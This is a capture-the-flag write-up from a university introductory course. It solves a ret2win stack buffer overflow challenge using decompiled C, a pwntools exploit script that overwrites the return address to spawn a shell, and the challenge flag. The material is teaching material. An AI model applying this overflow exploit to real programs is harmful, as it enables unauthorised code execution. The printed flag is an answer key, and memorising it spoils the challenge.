---
title: "AAAA - Writeup | URJC CTF Course"
layout: post
author: Jorge Moreno
---
This challenge is part of an [introductory CTF course](urjc-introductory-ctf) organized by students of Universidad Rey Juan Carlos.

## Challenge Description
---

> ¡Ups! Parece que me he olvidado una opción que no debería aparecer en el programa que he creado como cliente de correo. Menos mal que es super seguro, ¿a que sí? 
  
Challenge Author(s): [David Billhardt](https://twitter.com/t0ct0u)  
Official Writeup: [AAAA.pdf](images/beginner-bof-wu/AAAA.pdf)   
Category: **Binary Explotation**  
Difficulty: **Very Easy**  
Challenge Files: [AAAA.zip](images/befinner-bof-wu/AAAA.zip)  

## TL;DR

---

This challenge is an standard ret2win. We overflow the buffer into overriding the RIP and jumping to the win function to spawn a shell.

## Challenge Solution

---

First thing we are going to do is analyze the file with the ``file`` and ``checksec`` commands:

![Untitled](images/beginner-bof-wu/Untitled.png)

![Untitled](images/beginner-bof-wu/Untitled%201.png)

As we can see the only relevant restriction this binary has is the No eXecute bit. Which disallows us to execute any shellcode inside the stack.

After analyzing the different functions the program we see that it is a binary that shows us a menu to log in, print the name of the user, and send a message. After the decompilation we can see 2 important things:

- A function ``rce()`` that spawns a shell

```c
void rce(void){
		system("bin/sh");
		return;
}
```

- And the function ``enviar()`` that sends a message to an specific user

```c
void enviar(void)

{
  undefined message [208];
  undefined name [32];
  
  printf(&DAT_004020e0); // Prompts for the name
  __isoc99_scanf(&%20s,name);
  puts(&DAT_00402108); // Prompts for the message
  __isoc99_scanf("%s",message);
  printf("Mensaje enviado a %s",name);
  return;
}
```

The first ``scanf()`` only receives up to 20 characters, but the second one has no limit so it is vulnerable to **Buffer Overflow**. We are going to test this by sending to the program a bunch of A’s.

![Untitled](images/beginner-bof-wu/Untitled%202.png)

The program crashes because we overflow the buffer up to the RSP so after the ``ret;`` instruction it tries to jump into the address ``0x6161616161616161 (AAAAAAAA)``.

We are going to use pwndbg’s ``cyclic`` command to get the offset and override the first rsp bytes with the address of the ``rce()`` function.

![Untitled](images/beginner-bof-wu/Untitled%203.png)

![Untitled](images/beginner-bof-wu/Untitled%204.png)

Then we need to get the address of the ``rce()`` function. We can do this with pwntools.

![Untitled](images/beginner-bof-wu/Untitled%205.png)

Full script:

```python
#!/usr/bin/python3

from pwn import *

exe = context.binary = ELF(args.EXE or './AAAA', checksec = False)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

offset = 248
rce_addr = exe.symbols.rce
ret = 0x000000000040101a # For stack aligning purposes

io = start()

payload = b"A" * offset
payload += flat(ret)
payload += flat(rce_addr)

io.sendlineafter(b'>', b'3') # Option
io.sendlineafter(b'>', b'a') # Name
io.recvline() # We do this because the prompt has a special character that pwntools doesn't work well with.
io.sendline(payload) # Payload

io.interactive()
```



**FLAG -- HackOn{c0MM0n_ret2wIN_1s_ez}**